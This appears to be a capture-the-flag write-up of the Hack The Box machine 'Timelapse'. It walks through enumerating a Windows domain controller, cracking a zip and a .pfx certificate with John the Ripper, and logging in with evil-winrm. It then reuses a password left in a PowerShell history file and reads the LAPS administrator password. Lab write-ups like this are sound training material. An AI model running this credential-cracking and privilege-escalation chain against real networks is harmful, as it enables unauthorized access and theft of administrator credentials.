---
title: "HTB - Timelapse"
date: 2023-03-11T18:12:14+01:00
draft: false
tags: [HTB, Easy, Windows pfx LAPS ms-mcs-AdmPwd]
---

## Foothold
### Nmap 
```
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-17 04:26:06Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open ldapssl?  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)  
3269/tcp open globalcatLDAPssl?  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|_clock-skew: 7h59m58s  
| smb2-security-mode:  
| 3.1.1:  
|_ Message signing enabled and required  
| smb2-time:  
| date: 2022-08-17T04:26:18  
|_ start_date: N/A
```

Typical windows box. Let's look for look for interresting stuff:
#### LDAP
```
nmap -n -sV --script "ldap* and not brute" timelapse.htb  -Pn
	dap-rootdse:  
| LDAP Results  
| <ROOT>  
| domainFunctionality: 7  
| forestFunctionality: 7  
| domainControllerFunctionality: 7  
| rootDomainNamingContext: DC=timelapse,DC=htb  
| ldapServiceName: timelapse.htb:dc01$@TIMELAPSE.HTB  
| isGlobalCatalogReady: TRUE  
| supportedSASLMechanisms: GSSAPI  
| supportedSASLMechanisms: GSS-SPNEGO  
| supportedSASLMechanisms: EXTERNAL  
| supportedSASLMechanisms: DIGEST-MD5  
| supportedLDAPVersion: 3  
| supportedLDAPVersion: 2  
| supportedLDAPPolicies: MaxPoolThreads  
| supportedLDAPPolicies: MaxPercentDirSyncRequests  
| supportedLDAPPolicies: MaxDatagramRecv  
| supportedLDAPPolicies: MaxReceiveBuffer  
| supportedLDAPPolicies: InitRecvTimeout  
| supportedLDAPPolicies: MaxConnections  
| supportedLDAPPolicies: MaxConnIdleTime  
| supportedLDAPPolicies: MaxPageSize  
| supportedLDAPPolicies: MaxBatchReturnMessages  
| supportedLDAPPolicies: MaxQueryDuration  
| supportedLDAPPolicies: MaxDirSyncDuration  
| supportedLDAPPolicies: MaxTempTableSize  
| supportedLDAPPolicies: MaxResultSetSize  
| supportedLDAPPolicies: MinResultSets  
| supportedLDAPPolicies: MaxResultSetsPerConn  
| supportedLDAPPolicies: MaxNotificationPerConn  
| supportedLDAPPolicies: MaxValRange  
| supportedLDAPPolicies: MaxValRangeTransitive  
| supportedLDAPPolicies: ThreadMemoryLimit  
| supportedLDAPPolicies: SystemMemoryLimitPercent  
| supportedControl: 1.2.840.113556.1.4.319  
| supportedControl: 1.2.840.113556.1.4.801  
| supportedControl: 1.2.840.113556.1.4.473  
| supportedControl: 1.2.840.113556.1.4.528  
| supportedControl: 1.2.840.113556.1.4.417  
| supportedControl: 1.2.840.113556.1.4.619  
| supportedControl: 1.2.840.113556.1.4.841  
| supportedControl: 1.2.840.113556.1.4.529  
| supportedControl: 1.2.840.113556.1.4.805  
| supportedControl: 1.2.840.113556.1.4.521  
| supportedControl: 1.2.840.113556.1.4.970  
| supportedControl: 1.2.840.113556.1.4.1338  
| supportedControl: 1.2.840.113556.1.4.474  
| supportedControl: 1.2.840.113556.1.4.1339  
| supportedControl: 1.2.840.113556.1.4.1340  
| supportedControl: 1.2.840.113556.1.4.1413  
| supportedControl: 2.16.840.1.113730.3.4.9  
| supportedControl: 2.16.840.1.113730.3.4.10  
| supportedControl: 1.2.840.113556.1.4.1504  
| supportedControl: 1.2.840.113556.1.4.1852  
| supportedControl: 1.2.840.113556.1.4.802  
| supportedControl: 1.2.840.113556.1.4.1907  
| supportedControl: 1.2.840.113556.1.4.1948  
| supportedControl: 1.2.840.113556.1.4.1974  
| supportedControl: 1.2.840.113556.1.4.1341  
| supportedControl: 1.2.840.113556.1.4.2026  
| supportedControl: 1.2.840.113556.1.4.2064  
| supportedControl: 1.2.840.113556.1.4.2065  
| supportedControl: 1.2.840.113556.1.4.2066  
| supportedControl: 1.2.840.113556.1.4.2090  
| supportedControl: 1.2.840.113556.1.4.2205  
| supportedControl: 1.2.840.113556.1.4.2204  
| supportedControl: 1.2.840.113556.1.4.2206  
| supportedControl: 1.2.840.113556.1.4.2211  
| supportedControl: 1.2.840.113556.1.4.2239  
| supportedControl: 1.2.840.113556.1.4.2255  
| supportedControl: 1.2.840.113556.1.4.2256  
| supportedControl: 1.2.840.113556.1.4.2309  
| supportedControl: 1.2.840.113556.1.4.2330  
| supportedControl: 1.2.840.113556.1.4.2354  
| supportedCapabilities: 1.2.840.113556.1.4.800  
| supportedCapabilities: 1.2.840.113556.1.4.1670  
| supportedCapabilities: 1.2.840.113556.1.4.1791  
| supportedCapabilities: 1.2.840.113556.1.4.1935  
| supportedCapabilities: 1.2.840.113556.1.4.2080  
| supportedCapabilities: 1.2.840.113556.1.4.2237  
| subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=timelapse,DC=htb  
| serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb  
| schemaNamingContext: CN=Schema,CN=Configuration,DC=timelapse,DC=htb  
| namingContexts: DC=timelapse,DC=htb  
| namingContexts: CN=Configuration,DC=timelapse,DC=htb  
| namingContexts: CN=Schema,CN=Configuration,DC=timelapse,DC=htb  
| namingContexts: DC=DomainDnsZones,DC=timelapse,DC=htb  
| namingContexts: DC=ForestDnsZones,DC=timelapse,DC=htb  
| isSynchronized: TRUE  
| highestCommittedUSN: 131212  
| dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb  
| dnsHostName: dc01.timelapse.htb  
| defaultNamingContext: DC=timelapse,DC=htb  
| currentTime: 20220817061937.0Z  
|_ configurationNamingContext: CN=Configuration,DC=timelapse,DC=htb
```
=> Machine's FQDN is dc01.timelapse.htb

### SMB
Enumerating shares gives us a share accessible by guest.
We retrieve a password protected zip file : `winrm_backup.zip`

## User 
User is a succession of password bruteforcing using JTR:
	- `zip2john` for the archive password
		- `zip2john winrm_backup.zip > zip_hash`
	- `pfx2john` for the `legacyy_dev_auth.pfx` file that was inside the archive
	- We can force the .pfx file using `pfx2jhon`
Finally, when can retrieve a `.pem` file with openssl from the .pfx using: 
	`openssl pkcs12 -in legacyy_dev_auth.pfx -out key.pem`

Splitting the key.pem into to files `legacyy.cert` and `legacyy.key` we can successfully connect to the machine using evil-winrm:
`evil-winrm -S -c legacyy.cert -k legacyy.key -i 10.10.11.152`

Upon connecting we can retrieve the user flag.

### LPE
No lateral movement is need in this box.
Using winPEAS we discover that a CLI history file was left by the user legacy
```
> type C:\Users\legacyy\...\PSReadLine\ConsoleHost_history.txt 
whoami  
ipconfig /all  
netstat -ano |select-string LIST  
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck  
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force  
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)  
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}  
get-aduser -filter * -properties *  
exit
```

Using those commands we can execute commands as svc_deploy.
We can use `net user svc_deploy`  in order to get more informations about `svc_deploy` user.
```
User name svc_deploy  
Full Name svc_deploy  
Comment  
User's comment  
Country/region code 000 (System Default)  
Account active Yes  
Account expires Never  
  
Password last set 10/25/2021 12:12:37 PM  
Password expires Never  
Password changeable 10/26/2021 12:12:37 PM  
Password required Yes  
User may change password Yes  
  
Workstations allowed All  
Logon script  
User profile  
Home directory  
Last logon 8/17/2022 12:31:12 AM  
  
Logon hours allowed All  
  
Local Group Memberships *Remote Management Use  
Global Group memberships *LAPS_Readers *Domain Users
```
LAPS_Reader => NICE!

Using the fact that `svc_deploy` can read from the LAPS (Local Administrator Password Solution) we can retrieve `ms-mcs-AdmPwd`

>The "ms-mcs-AdmPwd" a "confidential" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users
>*From https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#extract-laps-password*

Then:
```
> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}

PSComputerName : localhost  
RunspaceId : 6cbb179a-77d1-4100-89c2-f608731997fb  
DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb  
DNSHostName : dc01.timelapse.htb  
Enabled : True  
ms-Mcs-AdmPwd : oE,0DU#pshs25U3aC!IqM!,.  
ms-Mcs-AdmPwdExpirationTime : 133056103313755333  
Name : DC01  
ObjectClass : computer  
ObjectGUID : 6e10b102-6936-41aa-bb98-bed624c9b98f  
SamAccountName : DC01$  
SID : S-1-5-21-671920749-559770252-3318990721-1000  
UserPrincipalName :  
  
PSComputerName : localhost  
RunspaceId : 6cbb179a-77d1-4100-89c2-f608731997fb  
DistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb  
DNSHostName :  
Enabled : True  
Name : DB01  
ObjectClass : computer  
ObjectGUID : d38b3265-230f-47ae-bdcd-f7153da7659d  
SamAccountName : DB01$  
SID : S-1-5-21-671920749-559770252-3318990721-1606  
UserPrincipalName :  
  
PSComputerName : localhost  
RunspaceId : 6cbb179a-77d1-4100-89c2-f608731997fb  
DistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb  
DNSHostName :  
Enabled : True  
Name : WEB01  
ObjectClass : computer  
ObjectGUID : 897c7cfe-ba15-4181-8f2c-a74f88952683  
SamAccountName : WEB01$  
SID : S-1-5-21-671920749-559770252-3318990721-1607  
UserPrincipalName :  
  
PSComputerName : localhost  
RunspaceId : 6cbb179a-77d1-4100-89c2-f608731997fb  
DistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb  
DNSHostName :  
Enabled : True  
Name : DEV01  
ObjectClass : computer  
ObjectGUID : 02dc961a-7a60-4ec0-a151-0472768814ca  
SamAccountName : DEV01$  
SID : S-1-5-21-671920749-559770252-3318990721-1608  
UserPrincipalName :
```
We got the password yay!

We can then connect as Administrator on the machine using `evil-winrm` without forgetting to use the `-S` option since this is LDAPS and not LDAP.

AAAAAAAAAAAAAAAA